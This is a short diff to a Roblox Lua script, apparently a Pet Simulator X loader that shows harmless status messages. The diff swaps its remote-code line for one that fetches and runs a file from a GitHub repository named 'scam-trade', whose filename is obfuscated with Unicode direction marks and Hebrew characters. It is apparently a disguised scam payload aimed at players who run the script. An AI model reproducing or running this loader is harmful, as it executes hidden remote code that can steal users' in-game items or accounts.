@@ -7,4 +7,4 @@ _G.Text1 = "Script Loaded..."
 _G.Text2 = "Waiting for Script"
 _G.Text3 = "Checking Scripts..."
 _G.Text4 = "Starting Scripts..."
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua%22"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pixel420467/scam-trade/main/%E2%80%8F%E2%80%8F%E2%80%AB%D7%9E%D7%A1%D7%9E%D7%9A%20%D7%98%D7%A7%D7%A1%D7%98%20%E2%80%AB%D7%97%D7%93%D7%A9.txt"))()
